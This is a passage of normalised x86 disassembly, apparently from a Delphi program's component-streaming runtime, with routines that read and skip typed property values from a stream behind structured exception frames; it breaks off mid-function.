mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e564
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
movzx eax [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e56b
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x24 ]
call sub_405d28
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_405554
retn
jmp [ eax * 4 + jump_table_41e2e7 ]
mov eax [ rw-data ]
call sub_41ca50
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416614
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d034
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d0f4
movzx ecx al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d154
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41db44
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_416540
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9f0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4169c0
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41ea20
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168b8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41eadc
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4168e8
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41e904
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d034
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d034
cmp al 0xd
jne r-xdata
push ebp
call sub_41e13c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dcac
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416c44
jmp r-xdata
push ebp
call sub_41e198
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416614
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc40
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41db44
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e0b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebc0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416688
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41db44
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebc0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416c0c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebc0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416614
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41d1b0
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_416c0c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41db44
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41e0fc
pop ecx
jmp r-xdata
sub_41e570
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_405584
jmp r-xdata
mov eax [ ebx ]
call sub_419424
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_40af98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e5d0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e8f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e9c0
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41e8cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e890
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
mov eax [ ebp - 0x1c ]
call sub_418ff8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41e570
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_404528
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418d48
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_41e835
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_407688
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_419740
xor eax eax
push ebp
push sub_41e812
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4198f4
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e819
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_404650
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_419898
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41e866
call sub_402f84
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_404f40
jmp r-xdata
call sub_404eec
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41c754
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8d6
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41e895
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41c920
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_404eec
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8d6
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_404650
sub_41e904
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41e9ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41e981
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ebc0
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4164e8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41ca68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41caa0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e9b5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41e9e4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41e9e4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41d058
movzx ecx [ esp ]
mov eax esi
xor edx edx
call sub_405620
mov eax esi
call j_sub_4059f0
mov edx eax
movzx ecx [ esp ]
mov eax ebx
call sub_41d058
pop edx
pop esi
pop ebx
retn
sub_41ea20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41eacd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d034
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41eadc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4057d4
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ead4
lea eax [ ebp - 0x8 ]
call sub_405d28
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41ebc0
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41d058
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405c6c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41d058
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41d058
jmp r-xdata
jmp r-xdata
call sub_41ca68
sub_41eadc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ebb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41d034
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41ea20
mov edx [ ebp - 0xc ]
mov eax esi
call sub_405ea8
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ebba
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_41ebc0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41d058
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_405fa4
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41d058
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41d058
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_405c6c
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41d058
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407448
jmp r-xdata
jmp r-xdata
call sub_41ca68
sub_41ebd4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41ec10
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e9e4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec17
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41ec1c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41cc3c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41ecd0
mov eax [ ebx ]
call sub_41dcf8
pop ebx
pop ebp
retn
sub_41ec44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d058
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f0dc
pop ebx
pop ecx
pop ebp
retn
sub_41ec74
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41cc3c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41d034
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41dcf8
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41f0dc
jmp r-xdata
mov eax [ ebx ]
call sub_41ecd0
mov eax [ ebx ]
call sub_41cc3c
test al al
je r-xdata
mov eax [ ebx ]
call sub_41ee80
mov eax [ ebx ]
call sub_41dcf8
sub_41ecd0
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ee75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41ebc0
and eax 0x7f
cmp eax 0x15
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ee7c
lea eax [ ebp - 0x8 ]
call sub_405530
retn
jmp [ eax * 4 + jump_table_41ed07 ]
push ebp
call sub_41ec1c
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41e9e4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ec44
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebd4
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ec44
pop ecx
jmp r-xdata
push ebp
call sub_41ec74
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
push ebp
mov eax 0x2
call sub_41ec44
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f0dc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41ec44
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41f0dc
sub_41ee80
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41eebd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41e9e4
mov eax ebx
call sub_41ecd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eec4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_41eec8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41ef60
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41cc3c
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x28 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41e9e4
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41e9e4
jmp r-xdata
mov eax ebx
call sub_41ee80
mov eax ebx
call sub_41dcf8
jmp r-xdata
mov eax ebx
call sub_41cc3c
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41eec8
mov eax ebx
call sub_41dcf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ef67
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_405554
retn
sub_41ef70
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41f015
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4055c8
xor eax eax
mov [ ebp - 0x8 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4204e4
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f01c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ ebx + 0x5a ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
sub_41f040
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x4c ]
call [ edi + 0x48 ]
sub_41f068
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41cf84
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_418f38
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_40487c
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41cf84
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41f0dc
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41d058
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41d058
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41f124
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41f2cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41caf4
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41f2a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41d058
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_41b798
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x18 ]
call sub_41d058
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c388
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41f283
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_41ea20
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41d058
mov eax [ ebp - 0x18 ]
cdq
push edx
push eax
mov eax [ ebp - 0x10 ]
call sub_41b798
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d058
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_416234
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
lea eax [ ebp - 0x8 ]
call sub_40700c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_40f978
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f28a
mov eax [ ebp - 0x14 ]
call sub_404650
retn
sub_41f2ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f4fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41163c
mov eax [ ebp - 0x4 ]
call sub_41d034
and eax 0x7f
cmp eax 0x15
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
jmp [ eax * 4 + jump_table_41f32e ]
mov eax [ ebp - 0x4 ]
call sub_41ebc0
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc40
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4158a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc40
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4158a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dc40
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4158a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9f0
mov eax ebx
call sub_415aa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da6c
mov eax ebx
call sub_415aa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41da28
mov eax ebx
call sub_415aa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dab0
mov eax ebx
call sub_415ac8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db00
mov eax ebx
call sub_415ab4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ea20
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_415adc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41eadc
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_415b08
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ebc0
cmp al 0x9
sete dl
mov eax ebx
call sub_415a78
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41f124
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_411a68
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dcac
push edx
push eax
mov eax ebx
call sub_4159a4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f505
lea eax [ ebp - 0x1c ]
call sub_411650
lea eax [ ebp - 0xc ]
call sub_405d28
lea eax [ ebp - 0x8 ]
call sub_405530
retn
mov eax ebx
call sub_416324
jmp r-xdata
sub_41f50c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
